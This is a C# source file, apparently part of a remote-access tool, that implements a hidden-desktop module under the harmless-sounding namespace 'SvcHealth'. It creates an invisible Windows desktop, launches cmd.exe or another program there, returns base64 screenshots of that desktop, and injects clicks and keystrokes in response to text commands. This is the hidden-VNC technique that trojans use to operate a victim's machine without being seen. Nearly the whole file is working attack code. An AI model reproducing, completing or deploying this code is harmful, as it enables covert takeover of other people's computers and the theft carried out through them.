using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcHealth
{
    static class HiddenDesktop
    {
        static IntPtr desk;
        static string deskName;

        public static string Handle(string command)
        {
            if (!OperatingSystem.IsWindows()) return "hidden desktop requires windows";
            var rest = command.Length > 5 ? command[5..].Trim() : "";
            var sp = rest.IndexOf(' ');
            var action = sp < 0 ? rest : rest[..sp];
            var arg = sp < 0 ? "" : rest[(sp + 1)..].Trim();
            return action switch
            {
                "" or "start" => Start(string.IsNullOrEmpty(arg) ? @"C:\Windows\System32\cmd.exe" : arg),
                "frame" => Frame(),
                "click" => Click(arg, false),
                "rclick" => Click(arg, true),
                "type" => Type(arg),
                "key" => Key(string.IsNullOrEmpty(arg) ? 13 : int.Parse(arg)),
                "stop" => Stop(),
                _ => "unknown desktop action"
            };
        }

        static bool Ensure()
        {
            if (desk != IntPtr.Zero) return true;
            deskName = "d" + System.Diagnostics.Stopwatch.GetTimestamp().ToString("x");
            desk = CreateDesktopW(deskName, null, IntPtr.Zero, 0, 0x10000000, IntPtr.Zero);
            if (desk == IntPtr.Zero) desk = OpenDesktopW(deskName, 0, false, 0x10000000);
            return desk != IntPtr.Zero;
        }

        static string Start(string exe)
        {
            if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
            var si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>(), lpDesktop = "WinSta0\\" + deskName, dwFlags = 1, wShowWindow = 5 };
            if (!CreateProcessW(null, exe, IntPtr.Zero, IntPtr.Zero, false, 0x10, IntPtr.Zero, null, ref si, out var pi))
                return "spawn failed";
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return "desktop started pid=" + pi.dwProcessId;
        }

        static string Frame()
        {
            if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
            var hdc = GetDC(IntPtr.Zero);
            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
            if (sw <= 0 || sh <= 0) { sw = 1024; sh = 768; }
            int dw = sw > 320 ? 320 : sw, dh = Math.Max(1, sh * dw / sw);
            var mem = CreateCompatibleDC(hdc);
            var bmp = CreateCompatibleBitmap(hdc, dw, dh);
            var old = SelectObject(mem, bmp);
            StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, 0x00CC0020);
            SelectObject(mem, old);
            int stride = ((dw * 3 + 3) / 4) * 4;
            var pixels = new byte[stride * dh];
            var bi = new BITMAPINFO { biSize = 40, biWidth = dw, biHeight = dh, biPlanes = 1, biBitCount = 24 };
            GetDIBits(mem, bmp, 0, dh, pixels, ref bi, 0);
            DeleteObject(bmp); DeleteDC(mem); ReleaseDC(IntPtr.Zero, hdc);
            var file = new byte[54 + pixels.Length];
            file[0] = (byte)'B'; file[1] = (byte)'M';
            BitConverter.GetBytes(file.Length).CopyTo(file, 2);
            BitConverter.GetBytes(54).CopyTo(file, 10);
            BitConverter.GetBytes(40).CopyTo(file, 14);
            BitConverter.GetBytes(dw).CopyTo(file, 18);
            BitConverter.GetBytes(dh).CopyTo(file, 22);
            file[26] = 1; file[28] = 24;
            Buffer.BlockCopy(pixels, 0, file, 54, pixels.Length);
            return $"HDIMG:{sw},{sh}:{Convert.ToBase64String(file)}";
        }

        static string Click(string arg, bool right)
        {
            var p = arg.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (p.Length < 2) return "click needs x y";
            int x = int.Parse(p[0]), y = int.Parse(p[1]);
            if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
            if (sw <= 0) sw = 1024;
            if (sh <= 0) sh = 768;
            mouse_event(0x8001, x * 65535 / sw, y * 65535 / sh, 0, 0);
            mouse_event(right ? 0x0008u : 0x0002u, 0, 0, 0, 0);
            mouse_event(right ? 0x0010u : 0x0004u, 0, 0, 0, 0);
            return (right ? "rclick " : "click ") + x + " " + y;
        }

        static string Type(string text)
        {
            if (string.IsNullOrEmpty(text)) return "type needs text";
            if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
            foreach (var ch in text)
            {
                if (ch == '\n' || ch == '\r') { keybd_event(13, 0, 0, 0); keybd_event(13, 0, 2, 0); continue; }
                short pair = VkKeyScanW(ch);
                byte vk = (byte)(pair & 0xFF);
                if (vk == 0xFF) continue;
                if ((pair & 0x100) != 0) keybd_event(0x10, 0, 0, 0);
                keybd_event(vk, 0, 0, 0);
                keybd_event(vk, 0, 2, 0);
                if ((pair & 0x100) != 0) keybd_event(0x10, 0, 2, 0);
            }
            return "typed " + text.Length;
        }

        static string Key(int vk)
        {
            if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
            keybd_event((byte)vk, 0, 0, 0);
            keybd_event((byte)vk, 0, 2, 0);
            return "key " + vk;
        }

        static string Stop()
        {
            if (desk != IntPtr.Zero) { CloseDesktop(desk); desk = IntPtr.Zero; }
            return "desktop stopped";
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public int biSize, biWidth, biHeight;
            public short biPlanes, biBitCount;
            public int biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant;
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern IntPtr CreateDesktopW(string n, string d, IntPtr dm, int f, int acc, IntPtr sa);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern IntPtr OpenDesktopW(string n, int f, bool inherit, int acc);
        [DllImport("user32.dll")] static extern bool SetThreadDesktop(IntPtr h);
        [DllImport("user32.dll")] static extern bool CloseDesktop(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr h, IntPtr hdc);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int i);
        [DllImport("user32.dll")] static extern void mouse_event(uint f, int x, int y, uint d, int e);
        [DllImport("user32.dll")] static extern void keybd_event(byte vk, byte scan, uint f, int e);
        [DllImport("user32.dll")] static extern short VkKeyScanW(char ch);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
        [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr o);
        [DllImport("gdi32.dll")] static extern bool StretchBlt(IntPtr d, int x, int y, int w, int h, IntPtr s, int sx, int sy, int sw, int sh, int rop);
        [DllImport("gdi32.dll")] static extern int GetDIBits(IntPtr hdc, IntPtr bmp, int start, int lines, byte[] bits, ref BITMAPINFO bi, int usage);
        [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr o);
        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, int flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    }
}
